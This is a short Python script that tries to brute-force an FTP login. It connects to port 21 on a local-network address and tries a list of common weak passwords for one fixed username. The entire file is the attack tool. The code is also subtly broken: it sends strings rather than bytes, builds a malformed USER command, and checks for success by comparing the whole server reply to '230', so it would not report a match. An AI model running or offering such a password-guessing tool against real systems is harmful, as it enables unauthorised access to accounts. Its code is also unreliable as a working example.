import socket
import re
import sys

IP = '192.168.1.105'
PORT = 21
USERNAME = "Nulibyte"

passwords = ["Test", "test", "admin", "Admin", "admin1", "password", "Password", "123", "123456789", "root"]


def connect(username, password):

    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    print(f"Trying {username} + {password}")
    
    s.connect((IP, PORT))
    data = s.recv(1024)
    s.send('USER'+username+'AR\n')
    data = s.recv(1024)
    s.send('PASS'+password+'\r\n')
    data = s.recv(1024)
    s.send('QUIT\r\n')
    
    s.close()
    return data

for password in passwords:
    attempts = connect(USERNAME, password)
    if attempts == "230":
        print(f"password found: {password}")
